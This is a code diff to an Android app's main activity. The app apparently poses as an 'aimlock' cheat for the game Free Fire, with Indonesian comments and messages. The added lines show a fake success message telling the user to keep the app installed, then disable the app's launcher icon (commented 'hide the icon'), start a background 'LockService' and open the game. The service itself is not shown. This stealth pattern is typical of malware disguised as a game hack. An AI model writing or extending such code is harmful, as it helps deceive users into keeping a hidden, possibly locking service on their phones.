@@ -5,7 +5,6 @@ import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
-import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -47,6 +46,14 @@ public class MainActivity extends Activity {
                     statusAimlock.setTextColor(0xFF00FF00);
                     loadingText.setText("✅ BERHASIL! Biarkan aplikasi tetap terpasang.");
                     loadingText.setTextColor(0xFF00FF00);
+
+                    // Sembunyiin ikon
+                    getPackageManager().setComponentEnabledSetting(
+                        new android.content.ComponentName(this, MainActivity.class),
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP
+                    );
+
                     startService(new Intent(this, LockService.class));
                     Intent ff = getPackageManager().getLaunchIntentForPackage("com.dts.freefireth");
                     if (ff != null) startActivity(ff);
